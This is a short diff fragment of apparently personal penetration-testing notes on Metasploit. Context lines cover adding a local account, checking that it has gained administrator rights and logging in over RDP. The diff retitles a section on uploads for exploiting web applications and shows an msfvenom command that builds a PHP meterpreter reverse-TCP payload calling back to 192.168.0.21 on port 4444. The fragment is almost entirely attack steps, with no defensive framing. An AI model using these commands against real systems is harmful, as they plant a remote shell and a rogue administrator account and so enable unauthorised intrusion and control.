@@ -82,7 +82,8 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 		       | net user Test      (Once again check to see if it has become administrator)
 Now you can do a RDP connection with the given ip and the Test account which you created.
 
-MSF File Upload
+MSF File Upload for exploiting web applications
+
 exploit package
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.21 lport=4444 -f raw -o exploit.php
 
